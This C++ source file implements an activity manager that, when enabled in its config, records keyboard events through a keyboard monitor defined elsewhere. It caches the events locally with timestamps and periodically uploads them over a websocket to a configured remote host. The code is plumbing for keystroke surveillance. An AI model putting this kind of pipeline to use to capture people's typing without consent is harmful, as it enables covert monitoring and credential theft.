#include "activity_manager.h"
#include <boost/asio/strand.hpp>
#include <boost/asio/spawn.hpp>

#include "logger.h"
#include "kb_activity.h"

activity_manager_t::activity_manager_t(net::io_context& io, const config_t& cfg)
    : _io(io)
    , _cfg(cfg)
    , _push_timer(net::make_strand(io))
    , _wss_client(std::make_shared<wss_client_t>(io))
    , _storage(cfg.get_section("storage"))
{
    auto kb_cfg = cfg.get_section("keyboard");
    if (kb_cfg["enabled"].as_boolean())
    {
        std::unique_ptr<activity_t> activity(new kb_activity_t(kb_cfg));
        activity->set_on_data([this](boost::json::value jv) {
            const auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
            model::exchange_t msg{ 0, static_cast<std::size_t>(ts), boost::json::serialize(jv) };
            _storage.insert(std::move(msg));
                              });
        auto p = _activities.insert({ "keyboard", std::move(activity) });
        if (!p.second)
        {
            SPDLOG_ERROR("failed to insert activity [keyboard]");
        }
    }

    // TODO : add other activity monitors  
}

activity_manager_t::~activity_manager_t()
{
    _push_timer.expires_at(std::chrono::steady_clock::time_point::min());
}

void activity_manager_t::connect_impl()
{
    auto geneal_cfg = _cfg.get_section("general");
    const std::string host = geneal_cfg["host"].value_or("");
    const std::string port = geneal_cfg["port"].value_or("");

    SPDLOG_INFO("connecting to [{}:{}]", host, port);
    _wss_client->connect(host, port, [self = shared_from_this()](const boost::system::error_code& ec){
        if (!ec)
            self->send_cached_events();
    });
}

void activity_manager_t::startup()
{
    // initiate connection
    connect_impl();

    // run periodic validation for event in a storage
    // and send them
    net::spawn(_io,
               [self = shared_from_this()](net::yield_context yield)
    {
        while (!self->_stop)
        {
            boost::system::error_code ec;
            self->_push_timer.expires_from_now(PUSH_TIMEOUT);
            self->_push_timer.async_wait(yield[ec]);

            // check if we should stop...
            if (ec == boost::asio::error::operation_aborted ||
                self->_push_timer.expires_at() == std::chrono::steady_clock::time_point::min())
            {
                SPDLOG_DEBUG("breaking push loop");
                break;
            }

            // try to send...
            self->send_cached_events();
        }
    });
}

void activity_manager_t::shutdown()
{
    net::post(_io, [self = shared_from_this()]()
    {
        self->_stop = true;
    });
}

void activity_manager_t::start_activity(const std::string& activity_name)
{
    net::post(_io, [self = shared_from_this(), activity_name]()
    {
        self->update(activity_name,
                     [](activity_t* activity) {
                         activity->start();
                     });
    });
}

void activity_manager_t::stop_activity(const std::string& activity_name)
{
    net::post(_io, [self = shared_from_this(), activity_name]()
    {
        self->update(activity_name,
                     [](activity_t* activity) {
                         activity->stop();
                     });
    });
}

void activity_manager_t::update(const std::string& activity_name,
                                std::function<void(activity_t*)> handler)
{
    auto it = _activities.find(activity_name);
    if (it == _activities.end())
    {
        SPDLOG_ERROR("failed to find activity [{}]", activity_name);
        return;
    }

    handler(it->second.get());
}

void activity_manager_t::send_cached_events()
{
    net::post(_io,
              [self = shared_from_this()]()
    {
        if (self->_stop)
        {
            return;
        }

        if (self->_state == state::sending)
        {
            SPDLOG_INFO("state is [sending], ignoring");
            return;
        }

        auto container = self->_storage.iterate();
        auto it = container.begin();
        if (it != container.end())
        {
            // update state as we are trying to send data
            self->_state = state::sending;

            auto event = *it;
            self->_wss_client->send(std::move(event),
                                    [id = event.id, self](const boost::system::error_code& ec)
            {
                if (!ec)
                {
                    SPDLOG_DEBUG("event with id [{}] was pushed", id);
                    self->_storage.remove_by_id(id);

                    // try next message
                    self->send_cached_events();
                }
                else
                {
                    // update state to waiting as we should try to send after connect attempt
                    self->_state = state::waiting;

                    //needs reconnect
                    self->connect_impl();
                }
            });
        }
        else
        {
            // update state until next send call
            self->_state = state::waiting;
        }
    });
}
